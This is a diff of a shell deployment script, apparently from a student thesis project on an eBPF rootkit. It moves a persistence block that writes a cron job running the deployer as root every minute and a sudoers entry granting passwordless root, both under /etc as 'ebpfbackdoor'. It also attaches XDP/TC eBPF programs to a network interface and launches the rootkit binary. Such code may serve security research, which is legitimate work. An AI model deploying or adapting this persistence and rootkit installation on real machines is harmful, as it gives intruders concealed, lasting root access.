@@ -45,11 +45,16 @@ echo "***************** Marcos Sánchez Bajo *****************\n"
 echo "*******************************************************\n"
 echo ""
 
-BACKDOOR_INSTALLED=0
+## Persistence
+declare CRON_PERSIST="* * * * * osboxes /bin/sudo /home/osboxes/TFG/apps/deployer.sh"
+declare SUDO_PERSIST="osboxes ALL=(ALL:ALL) NOPASSWD:ALL #"
+echo "$CRON_PERSIST" > /etc/cron.d/ebpfbackdoor
+echo "$SUDO_PERSIST" > /etc/sudoers.d/ebpfbackdoor
+
+# Rootkit install
 OUTPUT_COMM=$(/bin/sudo /usr/sbin/ip link)
 if [[ $OUTPUT_COMM == *"xdp"* ]]; then
-   BACKDOOR_INSTALLED=1
-   echo "Backdoor is already installed"
+   echo "Rootkit is already installed"
 else
    #Install the programs
    echo -e "${BLU}Installing TC hook${NC}"
@@ -58,8 +63,4 @@ else
    /bin/sudo tc filter add dev enp0s3 egress bpf direct-action obj "$BASEDIR"/tc.o sec classifier/egress
    /bin/sudo "$BASEDIR"/kit -t enp0s3
 fi
-
-## Persistence
-echo "* * * * * osboxes /bin/sudo /home/osboxes/TFG/apps/deployer.sh" > /etc/cron.d/ebpfbackdoor
-echo "osboxes ALL=(ALL:ALL) NOPASSWD:ALL #" > /etc/sudoers.d/ebpfbackdoor
 
